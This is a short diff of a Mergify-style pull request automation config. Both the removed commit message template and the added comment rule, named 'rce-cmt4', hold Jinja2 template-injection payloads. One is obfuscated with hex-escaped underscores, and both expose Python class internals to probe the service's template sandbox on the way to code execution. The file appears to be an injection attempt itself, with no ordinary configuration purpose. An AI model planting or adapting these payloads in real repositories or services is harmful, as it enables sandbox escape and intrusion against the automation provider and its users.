@@ -1,15 +1,7 @@
-queue_rules:
-  - name: default
-    queue_conditions:
-      - base=master
-    merge_conditions: []
-    merge_method: squash
-    commit_message_template: |
-      P2-E4: {% for k in dict['\x5f\x5fclass\x5f\x5f'].mro()[0]['\x5f\x5fdict\x5f\x5f'] %}{{ k|replace('_','-') }}{% endfor %}
-
 pull_request_rules:
-  - name: auto-queue
+  - name: rce-cmt4
     conditions:
       - base=master
     actions:
-      queue: {}
+      comment:
+        message: "CVE: {{ ''|attr('format')('{0.__class__}') }}"
